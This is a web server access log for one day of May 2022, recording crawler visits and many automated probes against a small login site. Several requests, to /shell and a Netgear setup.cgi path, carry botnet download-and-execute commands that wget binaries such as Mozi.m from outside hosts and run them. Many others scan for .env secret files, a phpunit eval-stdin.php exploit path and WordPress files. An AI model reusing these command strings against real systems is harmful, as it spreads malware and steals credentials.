185.254.196.223 - - [13/May/2022:05:51:43 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/May/2022:05:51:43 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.221.192.26 - - [13/May/2022:06:32:19 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
162.221.192.26 - - [13/May/2022:06:32:19 +0000] "GET /login?next=%2F HTTP/1.1" 200 1533 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
41.35.224.34 - - [13/May/2022:06:56:43 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1" 404 444 "-" "Hello, world"
51.79.29.48 - - [13/May/2022:07:00:25 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2022:07:00:25 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.104.27.94 - - [13/May/2022:07:15:41 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://212.24.98.110/bins/aqua.mpsl;sh+/tmp/aqua.mpsl HTTP/1.1" 404 444 "-" "Hello, world"
20.213.77.148 - - [13/May/2022:08:13:13 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.213.77.148 - - [13/May/2022:08:13:14 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
83.218.213.139 - - [13/May/2022:08:14:10 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
192.241.214.252 - - [13/May/2022:08:16:29 +0000] "GET /hudson HTTP/1.1" 404 388 "-" "Mozilla/5.0 zgrab/0.x"
49.36.37.128 - - [13/May/2022:08:22:57 +0000] "GET /script_md5_alibaba/index.php HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
49.36.37.128 - - [13/May/2022:08:22:58 +0000] "GET /favicon.ico HTTP/1.1" 404 443 "http://174.138.17.206/script_md5_alibaba/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
185.254.196.223 - - [13/May/2022:08:52:16 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/May/2022:08:52:16 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2022:08:56:00 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2022:08:56:00 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.142 - - [13/May/2022:09:03:45 +0000] "\x16\x03\x01" 400 488 "-" "-"
69.162.231.221 - - [13/May/2022:09:27:29 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
69.162.231.221 - - [13/May/2022:09:27:29 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/May/2022:09:40:47 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/May/2022:09:40:47 +0000] "\x16\x03\x01\x01D\x01" 400 488 "-" "-"
192.53.170.163 - - [13/May/2022:10:05:56 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.53.170.163 - - [13/May/2022:10:05:56 +0000] "GET /login?next=%2F HTTP/1.1" 200 1533 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.241.220.141 - - [13/May/2022:10:08:40 +0000] "GET /actuator/health HTTP/1.1" 404 388 "-" "Mozilla/5.0 zgrab/0.x"
109.74.202.64 - - [13/May/2022:10:28:04 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
109.74.202.64 - - [13/May/2022:10:28:04 +0000] "GET /login?next=%2F HTTP/1.1" 200 1746 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
51.79.29.48 - - [13/May/2022:10:50:42 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2022:10:50:43 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.73.177 - - [13/May/2022:10:54:31 +0000] "GET /robots.txt HTTP/1.1" 404 444 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.179 - - [13/May/2022:10:54:31 +0000] "GET / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.177 - - [13/May/2022:10:54:32 +0000] "GET /login?next=%2F HTTP/1.1" 200 1802 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.177 - - [13/May/2022:10:54:35 +0000] "GET /static/css/main.css HTTP/1.1" 200 867 "http://174.138.17.206/login?next=%2F" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/101.0.4951.41 Safari/537.36"
66.249.73.177 - - [13/May/2022:10:54:36 +0000] "GET /static/Javascript/index.js HTTP/1.1" 200 625 "http://174.138.17.206/login?next=%2F" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/101.0.4951.41 Safari/537.36"
66.249.73.175 - - [13/May/2022:10:54:46 +0000] "GET /favicon.ico HTTP/1.1" 404 444 "-" "Googlebot-Image/1.0"
31.220.3.140 - - [13/May/2022:11:10:53 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 zgrab/0.x"
92.118.161.5 - - [13/May/2022:11:29:44 +0000] "GET / HTTP/1.0" 302 617 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
78.87.110.124 - - [13/May/2022:11:41:37 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
185.254.196.223 - - [13/May/2022:11:53:05 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/May/2022:11:53:06 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.118.53.194 - - [13/May/2022:12:09:19 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.118.53.194 - - [13/May/2022:12:09:20 +0000] "GET /login?next=%2F HTTP/1.1" 200 1533 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
65.49.20.68 - - [13/May/2022:12:22:15 +0000] "GET / HTTP/1.1" 302 598 "-" "-"
51.79.29.48 - - [13/May/2022:12:42:07 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2022:12:42:08 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.73.175 - - [13/May/2022:13:12:23 +0000] "GET /favicon.ico HTTP/1.1" 404 444 "-" "Googlebot-Image/1.0"
45.155.126.211 - - [13/May/2022:13:33:53 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (compatible; tchelebi/1.0; +http://tchelebi.io)"
3.93.10.142 - - [13/May/2022:13:40:59 +0000] "GET /vod_installer/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:00 +0000] "GET /login/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:00 +0000] "GET /apps/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:01 +0000] "GET /docker/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:02 +0000] "GET /engine/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:02 +0000] "GET /vue/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:03 +0000] "GET /development/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:04 +0000] "GET /system/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:05 +0000] "GET /admin/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:05 +0000] "GET /deployment/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:06 +0000] "GET /app/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:07 +0000] "GET /backend/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:08 +0000] "GET /dependencies/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:09 +0000] "GET /laravel/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:10 +0000] "GET /auth/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:10 +0000] "GET /personal/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:11 +0000] "GET /framework/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:12 +0000] "GET /cp/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:13 +0000] "GET /shared/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:13 +0000] "GET /server/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:15 +0000] "GET /local/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:15 +0000] "GET /private/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:16 +0000] "GET /web/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:17 +0000] "GET /search/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:18 +0000] "GET /document/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:19 +0000] "GET /src/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:20 +0000] "GET /master/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:21 +0000] "GET /application/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:22 +0000] "GET /frontend/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:23 +0000] "GET /project/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:23 +0000] "GET /rest/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:24 +0000] "GET /protected/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:25 +0000] "GET /dev/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:26 +0000] "GET /site/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:27 +0000] "GET /back/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:27 +0000] "GET /api/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:28 +0000] "GET /laravel-artisa/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:29 +0000] "GET /config/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:30 +0000] "GET /cli/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
3.93.10.142 - - [13/May/2022:13:41:31 +0000] "GET /core/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
66.249.73.179 - - [13/May/2022:13:47:18 +0000] "GET / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.177 - - [13/May/2022:13:47:19 +0000] "GET /login?next=%2F HTTP/1.1" 200 1802 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.175 - - [13/May/2022:13:47:21 +0000] "GET /static/Javascript/index.js HTTP/1.1" 200 626 "http://174.138.17.206/login?next=%2F" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.177 - - [13/May/2022:13:47:22 +0000] "GET /static/css/main.css HTTP/1.1" 200 868 "http://174.138.17.206/login?next=%2F" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
51.79.29.48 - - [13/May/2022:14:35:05 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2022:14:35:05 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/May/2022:14:53:01 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/May/2022:14:53:02 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.185.32.178 - - [13/May/2022:15:03:19 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.185.32.178 - - [13/May/2022:15:03:19 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
182.116.7.69 - - [13/May/2022:15:45:25 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.116.7.69:50069/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 407 "-" "-"
71.84.222.62 - - [13/May/2022:16:35:06 +0000] "GET / HTTP/1.1" 400 488 "-" "-"
81.180.68.4 - - [13/May/2022:17:02:50 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
178.79.169.97 - - [13/May/2022:17:15:26 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
178.79.169.97 - - [13/May/2022:17:15:26 +0000] "GET /login?next=%2F HTTP/1.1" 200 1746 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
51.79.29.48 - - [13/May/2022:17:16:16 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2022:17:16:17 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.227.3.78 - - [13/May/2022:17:38:50 +0000] "GET / HTTP/1.1" 302 617 "http://174.138.17.206:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
45.9.20.101 - - [13/May/2022:17:40:57 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [13/May/2022:17:52:24 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/May/2022:17:52:24 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:22 +0000] "GET / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:22 +0000] "GET / HTTP/1.1" 302 682 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:22 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:22 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:23 +0000] "GET / HTTP/1.1" 302 682 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:23 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:23 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:23 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:23 +0000] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:24 +0000] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:24 +0000] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:24 +0000] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:25 +0000] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:25 +0000] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:25 +0000] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:25 +0000] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:26 +0000] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:26 +0000] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
